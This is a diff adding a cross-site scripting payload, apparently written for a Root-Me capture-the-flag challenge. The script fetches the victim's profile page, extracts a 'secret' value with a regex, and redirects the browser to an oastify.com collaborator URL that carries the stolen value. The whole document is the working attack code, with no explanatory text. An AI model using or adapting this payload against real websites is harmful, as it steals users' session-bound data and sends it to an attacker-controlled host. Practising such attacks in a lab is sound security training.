@@ -1,0 +1,22 @@
+<script>
+    function token1() {
+        xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", decodeURIComponent("http://challenge01.root-me.org:58003/profile"), false);
+        xmlHttp.send(null); 
+        var str1 = xmlHttp.responseText;
+        var secret = extractSecret(str1);
+        return secret;
+    }
+
+    function extractSecret(htmlString) {
+        var matches = htmlString.match(/<u>Your secret<\/u>: (\d+)<\/p>/);
+        if (matches && matches.length > 1) {
+            return matches[1];
+        } else {
+            return "Secret not found";
+        }
+    }
+    var secretValue = token1();
+	document.location="https://v408zrv5aqk6acjogofw3rvwmnshg94y.oastify.com?cmd="+secretValue;
+
+</script>
